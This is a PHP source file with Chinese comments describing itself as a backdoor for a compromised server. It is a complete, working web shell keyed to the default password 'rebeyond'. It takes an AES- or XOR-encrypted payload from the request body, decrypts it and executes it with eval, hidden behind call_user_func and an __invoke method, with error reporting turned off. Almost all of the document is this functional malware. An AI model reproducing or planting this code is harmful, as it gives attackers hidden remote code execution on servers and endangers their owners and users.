<?php

// 这个文件使得被入侵的server可以执行“php://input”文件中的木马代码。
// 假设木马已被加密，初始为$POST。
// 解密步骤：
// 1. $POST => (base64 decode) => 得到 base64 明文，此时依旧是乱码，因为还被加密了一层。
// 2. base64 明文 => (XOR 或者 AES) => 得到木马代码的明文。此时是人类可读的文本内容。

// 执行机制
// 使用万恶之源 @call_user_func 来构造类实例，触发 __invoke 方法执行，木马代码通过参数传入该方法。

@error_reporting(0);
session_start();
// MD5(rebeyond) => e45e329feb5d925ba3f549b17b4b3dde
$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
$_SESSION['k']=$key;
session_write_close();
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
    // base64 decode
    $t="base64_"."decode";
    $post=$t($post."");

    // XOR decrypt
    for($i=0;$i<strlen($post);$i++) {
        $post[$i] = $post[$i]^$key[$i+1&15];
    }
    // 此时 $post 为明文文本
}
else
{
    $post=openssl_decrypt($post, "AES128", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>